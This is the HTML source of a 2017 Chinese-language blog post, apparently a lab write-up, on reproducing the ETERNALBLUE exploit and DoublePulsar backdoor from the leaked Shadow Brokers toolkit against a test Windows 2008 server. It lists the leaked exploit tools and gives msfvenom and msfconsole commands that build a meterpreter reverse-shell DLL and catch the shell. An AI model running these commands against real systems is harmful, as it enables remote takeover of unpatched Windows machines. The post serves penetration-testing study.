@@ -1,0 +1,1463 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="windows,code execution,equation group,eternalBlue,doublePulsar,tool," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器 。">
+<meta name="keywords" content="windows,code execution,equation group,eternalBlue,doublePulsar,tool">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2017 Equation Group 0day Tools">
+<meta property="og:url" content="http://orleven.orleven.com/2017/04/22/equation-group-0day-2017/index.html">
+<meta property="og:site_name" content="Orleven Blog">
+<meta property="og:description" content="概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器 。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-1.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-2.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-3.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-4.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-5.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-6.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-7.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-8.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-9.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-10.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-11.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-12.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-13.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-14.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-15.png">
+<meta property="og:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-16.png">
+<meta property="og:updated_time" content="2017-09-19T05:01:31.933Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2017 Equation Group 0day Tools">
+<meta name="twitter:description" content="概述Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下Windows服务器 。">
+<meta name="twitter:image" content="http://orleven.orleven.com/images/ETERNALBLUE/ETERNALBLUE-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://orleven.orleven.com/2017/04/22/equation-group-0day-2017/"/>
+
+
+
+
+
+  <title>2017 Equation Group 0day Tools | Orleven Blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?00a49c2d4ae104181c342efc37bbbdc8";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Orleven Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Orleven Blog</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://orleven.orleven.com/2017/04/22/equation-group-0day-2017/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Orleven">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Orleven Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2017 Equation Group 0day Tools</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-22T03:22:12+08:00">
+                2017-04-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/code-execution/" itemprop="url" rel="index">
+                    <span itemprop="name">code execution</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/04/22/equation-group-0day-2017/" class="leancloud_visitors" data-flag-title="2017 Equation Group 0day Tools">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>Shadow Brokers黑客组织上周泄露了NSA方程式组织的一些工具，其中某些工具客直接拿下<code>Windows</code>服务器 。</p>
+<a id="more"></a>
+<h1 id="工具包安装"><a href="#工具包安装" class="headerlink" title="工具包安装"></a>工具包安装</h1><ol>
+<li>下载安装 <a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">python-2.6.6.msi</a> ,<a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/" target="_blank" rel="noopener">pywin32-221.win32-py2.6.exe</a> 。</li>
+<li>下载解压 <a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="noopener">shadowbroker</a> 。</li>
+<li>在 <code>shadowbroker</code> 的 <code>windows</code> 目录下新建 <code>listeningposts</code> 目录。</li>
+</ol>
+<h1 id="工具包简介"><a href="#工具包简介" class="headerlink" title="工具包简介"></a>工具包简介</h1><ul>
+<li><code>swift</code> 银行攻击的证据</li>
+<li><code>oddjob</code> 植入后门等相关文档</li>
+<li><code>windows</code> 包含了各种漏洞利用工具</li>
+</ul>
+<p>最主要还是Windows目录，其包含了各种漏洞利用工具，在exploits中包含了丰富的漏洞利用工具，可影响windows多个平台。</p>
+<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><p>包含了很多漏洞利用工具，经过大佬们的初步梳理，重点关注对win server有影响的几个工具。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Tools</th>
+<th style="text-align:left">Service Port</th>
+<th style="text-align:left">Describe</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Explodingcan</td>
+<td style="text-align:left">IIS</td>
+<td style="text-align:left">IIS漏洞利用工具，只对Windows 2003有影响</td>
+</tr>
+<tr>
+<td style="text-align:left">Eternalromance</td>
+<td style="text-align:left">139和445</td>
+<td style="text-align:left">MS17-010 SMB 和 NBT漏洞利用工具</td>
+</tr>
+<tr>
+<td style="text-align:left">Emphasismine</td>
+<td style="text-align:left">143</td>
+<td style="text-align:left">通过ICMP漏洞工具</td>
+</tr>
+<tr>
+<td style="text-align:left">Englishmansdentist</td>
+<td style="text-align:left">SMTP(25)</td>
+<td style="text-align:left">通过SMTP漏洞工具</td>
+</tr>
+<tr>
+<td style="text-align:left">Erraticgopher</td>
+<td style="text-align:left">RPC(445)</td>
+<td style="text-align:left">通过RPC漏洞工具</td>
+</tr>
+<tr>
+<td style="text-align:left">Eskimoroll</td>
+<td style="text-align:left">88</td>
+<td style="text-align:left">MS14-068 漏洞利用工具，通过kerberos入侵</td>
+</tr>
+<tr>
+<td style="text-align:left">Eclipsedwing</td>
+<td style="text-align:left">SMB(445)</td>
+<td style="text-align:left">MS08-67 漏洞利用工具</td>
+</tr>
+<tr>
+<td style="text-align:left">Educatedscholar</td>
+<td style="text-align:left">SMB(445)</td>
+<td style="text-align:left">MS09-050 漏洞利用工具</td>
+</tr>
+<tr>
+<td style="text-align:left">Emeraldthread</td>
+<td style="text-align:left">139和445</td>
+<td style="text-align:left">MS10-061 MB和 Netbios 漏洞利用工具</td>
+</tr>
+<tr>
+<td style="text-align:left">Zippybeer</td>
+<td style="text-align:left">SMB(445)</td>
+<td style="text-align:left">SMTP漏洞利用工具</td>
+</tr>
+<tr>
+<td style="text-align:left">Eternalsynergy</td>
+<td style="text-align:left">SMB(445)</td>
+<td style="text-align:left">MS17-010 SMB漏洞利用工具</td>
+</tr>
+<tr>
+<td style="text-align:left">Esteemaudit</td>
+<td style="text-align:left">RDP(3389)</td>
+<td style="text-align:left">RDP漏洞利用工具</td>
+</tr>
+</tbody>
+</table>
+<h2 id="FUZZBUNCH"><a href="#FUZZBUNCH" class="headerlink" title="FUZZBUNCH"></a>FUZZBUNCH</h2><p>是一个类似 MSF的漏洞利用平台工具，python编写。</p>
+<h2 id="Specials"><a href="#Specials" class="headerlink" title="Specials"></a>Specials</h2><table>
+<thead>
+<tr>
+<th style="text-align:left">Tools</th>
+<th style="text-align:left">Service Port</th>
+<th style="text-align:left">Describe</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">ETERNALBLUE</td>
+<td style="text-align:left">SMB(445)</td>
+<td style="text-align:left">SMB漏洞利用工具，xp、2003、2008、7均有部分覆盖(MS17-010)</td>
+</tr>
+<tr>
+<td style="text-align:left">ETERNALCHAMPION</td>
+<td style="text-align:left">SMB(445)</td>
+<td style="text-align:left">SMB漏洞利用工具，xp、2003、2008、7均有部分覆盖(CVE-2017-0146/0147)</td>
+</tr>
+</tbody>
+</table>
+<h1 id="ETERNALBLUE"><a href="#ETERNALBLUE" class="headerlink" title="ETERNALBLUE"></a>ETERNALBLUE</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><h3 id="攻击机1"><a href="#攻击机1" class="headerlink" title="攻击机1"></a>攻击机1</h3><ul>
+<li>win7 64 旗舰版</li>
+<li><a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="noopener">python-2.6.6.msi</a> </li>
+<li><a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/" target="_blank" rel="noopener">pywin32-221.win32-py2.6.exe</a> </li>
+<li><a href="https://github.com/misterch0c/shadowbroker" target="_blank" rel="noopener">shadowbroker</a></li>
+<li>IP : 192.168.111.155</li>
+</ul>
+<h3 id="攻击机2"><a href="#攻击机2" class="headerlink" title="攻击机2"></a>攻击机2</h3><ul>
+<li>kali 2016.2</li>
+<li>IP : 192.168.111.144</li>
+</ul>
+<h3 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h3><ul>
+<li>win2008 </li>
+<li>IP : 192.168.111.158</li>
+</ul>
+<p>systeminfo 信息如下：<br><img src="/images/ETERNALBLUE/ETERNALBLUE-1.png" alt="ETERNALBLUE-1"></p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>初始化配置，创建一个攻击项目。</p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-2.png" alt="ETERNALBLUE-2"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-3.png" alt="ETERNALBLUE-3"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-4.png" alt="ETERNALBLUE-4"></p>
+<p>使用 <code>ETERNALBLUE</code> 模块。 </p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-5.png" alt="ETERNALBLUE-5"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-6.png" alt="ETERNALBLUE-6"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-7.png" alt="ETERNALBLUE-7"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-8.png" alt="ETERNALBLUE-8"></p>
+<p>使用 <code>DoublePulsar</code> 模块。</p>
+<p>DoublePulsar是一个后门程序，用于在已感染的系统上注入和运行恶意代码。这是一种NSA用作监听使用的后门程序，如今在GitHub上得到免费发布后，任何人均可使用。其软件是在Windows XP到Server 2008 R2系统版本中的计算机上，通过使用EternalBlue Exploit的SMB文件共享服务端口启动旧版本下的远程执行代码RCE，随后进行程序的安装。也就是说，会受到攻击影响的计算机系统是存在漏洞的Windows版本，因为这给攻击者提供了其SMB端口。</p>
+<p>这里要选择SMB和对应的目标操作系统位数下面的话是攻击的4个操作 选择RunDLL。</p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-9.png" alt="ETERNALBLUE-9"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-10.png" alt="ETERNALBLUE-10"></p>
+<p>这里用攻击机2 kali的msfvenom 生成一下dll 这里使用的是reverse_tcp的paylaod 可以根据网络情况采用其他payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.111.144 LPORT=5555 -f dll &gt; s.dll</div></pre></td></tr></table></figure>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-11.png" alt="ETERNALBLUE-11"></p>
+<p>把生成的s.dll传到攻击机1上去，</p>
+<p>然后kali开启msfconsole 监听，下面的payload要和上面msfvenom的payload对应起来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ msfconsole</div><div class="line">    msf &gt; use exploit/multi/handler</div><div class="line">    msf &gt; set LHOST 192.168.111.144</div><div class="line">    msf &gt; set LPORT 5555</div><div class="line">    msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">    msf &gt; exploit</div></pre></td></tr></table></figure>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-12.png" alt="ETERNALBLUE-12"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-13.png" alt="ETERNALBLUE-13"></p>
+<p>然后操作fb.py ，加载s.dll。</p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-14.png" alt="ETERNALBLUE-14"></p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-15.png" alt="ETERNALBLUE-15"></p>
+<p>kali 收到反弹的shell 。</p>
+<p><img src="/images/ETERNALBLUE/ETERNALBLUE-16.png" alt="ETERNALBLUE-16"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>当然，还有其他的攻击模块，下次继续更新。</p>
+<p>为了平时的渗透测试的方便，我临时写了个检测的<a href="https://github.com/orleven/NsaCheckTool" target="_blank" rel="noopener">脚本</a>（测试版）,供大家测试使用。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://po.baidu.com/feed/share?context=%7B%2522nid%2522%3A%2522news_10421100930874351826%2522%7D" target="_blank" rel="noopener">ShadowBrokers方程式工具包浅析，揭秘方程式组织工具包的前世今生</a><br><a href="http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=502990295&amp;idx=1&amp;sn=181c1e9b01854b87d3d4752c593c4dd4&amp;chksm=700a2442477dad54b542427edad3ec16df8cde9f470ee4e6f4597d4866d64b405801baf3d799&amp;mpshare=1&amp;scene=23&amp;srcid=0415zAW8ITp4RRkubgmCNYRI#rd" target="_blank" rel="noopener">方程式 0day ETERNALBLUE  复现过程</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/windows/" rel="tag"># windows</a>
+          
+            <a href="/tags/code-execution/" rel="tag"># code execution</a>
+          
+            <a href="/tags/equation-group/" rel="tag"># equation group</a>
+          
+            <a href="/tags/eternalBlue/" rel="tag"># eternalBlue</a>
+          
+            <a href="/tags/doublePulsar/" rel="tag"># doublePulsar</a>
+          
+            <a href="/tags/tool/" rel="tag"># tool</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/04/04/dizcus-pentest/" rel="next" title="Dizcus Pentest">
+                <i class="fa fa-chevron-left"></i> Dizcus Pentest
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/06/22/android-base/" rel="prev" title="Android 渗透测试基础入门">
+                Android 渗透测试基础入门 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+      
+        
+          <ul class="sidebar-nav motion-element">
+            <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+              文章目录
+            </li>
+            <li class="sidebar-nav-overview" data-target="site-overview">
+              站点概览
+            </li>
+          </ul>
+        
+      
+
+
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="Orleven" />
+          <p class="site-author-name" itemprop="name">Orleven</p>
+           
+              <p class="site-description motion-element" itemprop="description">Life is full of ups and downs.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/ || archive">
+                <span class="site-state-item-count">29</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">16</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">63</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-link"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.warmeng.com/" title="warmeng" target="_blank">warmeng</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.0kami.cn/" title="0kimi" target="_blank">0kimi</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+      
+        
+        <!--noindex-->
+          <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+            <div class="post-toc">
+
+              
+                
+              
+
+              
+                <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#概述"><span class="nav-number">1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工具包安装"><span class="nav-number">2.</span> <span class="nav-text">工具包安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工具包简介"><span class="nav-number">3.</span> <span class="nav-text">工具包简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploits"><span class="nav-number">3.1.</span> <span class="nav-text">Exploits</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FUZZBUNCH"><span class="nav-number">3.2.</span> <span class="nav-text">FUZZBUNCH</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Specials"><span class="nav-number">3.3.</span> <span class="nav-text">Specials</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ETERNALBLUE"><span class="nav-number">4.</span> <span class="nav-text">ETERNALBLUE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验环境"><span class="nav-number">4.1.</span> <span class="nav-text">实验环境</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击机1"><span class="nav-number">4.1.1.</span> <span class="nav-text">攻击机1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击机2"><span class="nav-number">4.1.2.</span> <span class="nav-text">攻击机2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#靶机"><span class="nav-number">4.1.3.</span> <span class="nav-text">靶机</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#复现过程"><span class="nav-number">4.2.</span> <span class="nav-text">复现过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+              
+
+            </div>
+          </section>
+        <!--/noindex-->
+        
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Orleven</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="http://www.orleven.com">orleven</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+  <div class="theme-info">  <a class="theme-link" target="_blank" href="https://blog.orleven.com">My blog</a> version 1.2 </div>
+
+
+
+  
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
